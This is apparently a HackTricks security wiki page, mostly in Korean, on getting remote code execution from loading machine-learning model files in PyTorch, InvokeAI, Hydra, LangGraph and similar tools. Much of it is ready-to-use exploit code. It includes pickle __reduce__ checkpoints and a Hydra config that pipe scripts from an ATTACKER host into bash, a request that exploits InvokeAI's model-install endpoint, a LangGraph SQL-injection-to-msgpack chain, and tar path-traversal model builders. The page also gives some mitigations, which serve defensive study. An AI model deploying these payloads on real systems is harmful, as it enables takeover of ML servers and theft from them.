# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning 모델은 보통 ONNX, TensorFlow, PyTorch 등 다양한 형식으로 공유된다. 이런 모델은 개발자 머신이나 프로덕션 시스템에 로드되어 사용된다. 보통 모델은 악성 코드를 포함해서는 안 되지만, 일부 경우에는 모델을 로드하는 라이브러리의 취약점 때문이거나, 의도된 기능으로 인해 모델이 시스템에서 임의 코드를 실행하는 데 사용될 수 있다.

작성 시점 기준으로, 이런 유형의 취약점 예시는 다음과 같다:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- model initialization 전에 NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, 그리고 FlexTok loaders에서 트리거됨.
- Hydra의 string block-list는 대체 import paths (예: `enum.bltns.eval`) 또는 application-resolved names (예: `nemo.core.classes.common.os.system` → `posix`)을 통해 우회 가능함.
- FlexTok는 stringified metadata를 `ast.literal_eval`로도 파싱하므로, Hydra 호출 전에 DoS(CPU/memory blowup)를 유발할 수 있음.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion을 위한 인기 있는 오픈소스 web interface다. 버전 **5.3.1 – 5.4.2**는 REST endpoint `/api/v2/models/install`을 노출하며, 이를 통해 사용자가 arbitrary URLs에서 models를 download하고 load할 수 있다.

내부적으로 해당 endpoint는 결국 다음을 호출한다:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
공급된 파일이 **PyTorch checkpoint (`*.ckpt`)**인 경우, `torch.load`는 **pickle deserialization**을 수행한다. content가 사용자 제어 URL에서 직접 오기 때문에, attacker는 checkpoint 안에 custom `__reduce__` method를 가진 malicious object를 embed할 수 있다. 이 method는 **deserialization 중에** 실행되며, InvokeAI server에서 **remote code execution (RCE)** 로 이어진다.

이 vulnerability는 **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %)로 할당되었다.

#### Exploitation walk-through

1. malicious checkpoint 생성:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt`를 당신이 제어하는 HTTP 서버에 호스팅합니다(예: `http://ATTACKER/payload.ckpt`).
3. 취약한 endpoint를 트리거합니다(인증 불필요):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스 컨텍스트에서 code execution을 얻는다.

바로 사용할 수 있는 exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029`가 전체 흐름을 자동화한다.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag 기본값 **false**)
•  공격자가 접근 가능한 `/api/v2/models/install`
•  Process가 shell commands를 실행할 권한을 가짐

#### Mitigations

* **InvokeAI ≥ 5.4.3**로 업그레이드 – patch는 `scan=True`를 기본값으로 설정하고 deserialization 전에 malware scanning을 수행한다.
* checkpoint를 programmatically 로드할 때는 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper를 사용한다.
* model sources에 대해 allow-lists / signatures를 강제하고 service를 least-privilege로 실행한다.

> ⚠️ 기억하라: **어떤** Python pickle-based format이든(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` files 포함) untrusted sources에서 deserialize하는 것은 본질적으로 unsafe하다.

---

older InvokeAI versions를 reverse proxy 뒤에서 계속 실행해야 한다면 사용할 수 있는 ad-hoc mitigation 예시:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)은 사용자 제공 경로에서 직접 `torch.load()`를 호출하는 unsafe checkpoint loader를 노출했다. `torch.load`는 Python `pickle`에 의존하므로, attacker-controlled checkpoint는 deserialization 중 reducer를 통해 arbitrary code를 실행할 수 있다.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: Python pickle에서 객체는 callable과 arguments를 반환하는 reducer (`__reduce__`/`__setstate__`)를 정의할 수 있다. 이 callable은 unpickling 동안 실행된다. 이런 객체가 checkpoint에 있으면, weights가 사용되기 전에 실행된다.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
전달 경로와 blast radius:
- repos, buckets, 또는 artifact registries를 통해 공유되는 Trojanized checkpoints/models
- checkpoints를 자동으로 로드하는 자동화된 resume/deploy pipelines
- 실행은 training/inference workers 내부에서 발생하며, 종종 더 높은 권한으로 실행됨(예: containers에서 root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802)는 `transformers4rec/utils/serialization.py`에 구현된 제한된 allow-listed deserializer로 직접적인 `torch.load()`를 대체했다. 새 loader는 types/fields를 검증하고, load 중 arbitrary callables가 호출되는 것을 방지한다.

PyTorch checkpoints에 대한 구체적인 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마라. 가능하면 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX처럼 non-executable formats를 사용하라.
- 반드시 PyTorch serialization을 사용해야 한다면, `weights_only=True`(신규 PyTorch에서 지원)를 보장하거나 Transformers4Rec patch와 유사한 custom allow-listed unpickler를 사용하라.
- model provenance/signatures를 강제하고 deserialization을 sandboxing하라(seccomp/AppArmor; non-root user; restricted FS 및 network egress 없음).
- checkpoint load 시점에 ML services에서 예상치 못한 child processes를 모니터링하라; `torch.load()`/`pickle` 사용을 추적하라.

POC 및 vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- model을 생성하라:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델을 로드합니다:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자 제어 데이터를 deserialize하는 `resnet` endpoint를 노출한다. ZDI는 원격 공격자가 피해자가 악성 page/file을 로드하도록 유도한 뒤, 해당 endpoint로 조작된 serialized blob을 보내게 만들고, `root` 권한으로 deserialization을 트리거하여 완전한 compromise로 이어질 수 있음을 확인했다.

exploit flow는 전형적인 pickle abuse와 유사하다:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
역직렬화 중 도달 가능한 어떤 gadget도(constructors, `__setstate__`, framework callbacks 등) 동일한 방식으로 무기화될 수 있으며, transport가 HTTP, WebSocket, 또는 watched directory에 떨어진 file인지와는 무관합니다.



### LangGraph checkpointer SQLi → MessagePack RCE

이 attack chain이 흥미로운 이유는 attacker가 **malicious model file을 upload할 필요가 없기 때문**입니다. 대신, application은 **AI-agent persistence API** (`get_state_history(..., filter=...)`)를 노출하고, user input이 checkpointer query builder에 도달합니다.

#### 1. metadata filters에서의 structural SQLi

취약한 SQLite pattern은 다음과 같았습니다:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
값은 나중에 바인딩되지만, `query_key`는 **JSON path 문자열**에 연결되므로, dictionary key 안의 `'`는 `'$.{query_key}'`에서 벗어나 SQL을 주입할 수 있다. 같은 교훈은 **JSON paths, identifiers, operators, `LIMIT`, 그리고 TTL fields**에도 적용된다: placeholder는 값만 보호하며, 구조적인 query syntax는 보호하지 않는다.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

쿼리는 `type`과 직렬화된 `checkpoint` bytes를 반환하며, 이는 나중에 다음과 같이 소비된다:
```python
self.serde.loads_typed((type, checkpoint))
```
즉, `WHERE` 절의 SQLi는 **가짜 결과 행**을 주입할 수 있다:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
나중에 코드가 어떤 선택된 column을 파싱, 역직렬화, 기록하거나 실행한다면, 그 columns를 해당 sinks에 매핑하라. 이 경우 fake row는 SQLi를 **attacker-controlled deserialization**으로 바꾼다.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

LangGraph의 `msgpack` 경로는 중첩된 tuple을 unpack하고 실행하는 custom extension hook을 사용했다:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
So `MessagePack` extension object 인코딩이 `("os", "system", "id > /tmp/pwned")`에 해당하는 것을 만들어내면 `os`를 import하고, `system`을 resolve한 뒤, 명령을 실행한다. AI frameworks를 검토할 때는 동적 import, reflection, 또는 arbitrary callable dispatch를 위해 **custom MessagePack/JSON/pickle revivers**를 확인하라.

#### 4. Practical audit pattern for agent frameworks

다음에 도달하는 user-controlled input을 검토하라:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders that generate SQL or Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- persistence layer에서 반환된 rows를 신뢰하는 recovery paths

이 specific chain은 untrusted users가 `filter`를 제어할 수 있을 때 **SQLite** 또는 **Redis** checkpointers를 사용하는 self-hosted LangGraph deployments에 영향을 주었다. disclosure에 언급된 patched versions는 `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, 그리고 `langgraph-checkpoint 4.0.1+`였다.

## Models to Path Traversal

[**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)에서 언급했듯이, 다양한 AI frameworks에서 사용되는 대부분의 models formats는 archives, 보통 `.zip`, 기반이다. 따라서 이러한 formats를 악용해 path traversal attacks를 수행할 수 있을 가능성이 있으며, 이를 통해 model이 로드되는 system에서 arbitrary files를 읽을 수 있다.

예를 들어, 다음 code를 사용하면 로드될 때 `/tmp` directory에 file을 생성하는 model을 만들 수 있다:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
또는 다음 code를 사용하면 로드될 때 `/tmp` 디렉터리로 symlink를 생성하는 model을 만들 수 있습니다:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

.keras 내부, Lambda-layer RCE, ≤ 3.8의 arbitrary import 문제, 그리고 allowlist 내부에서의 패치 이후 gadget 발견에 대한 집중 가이드는 여기에서 보세요:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
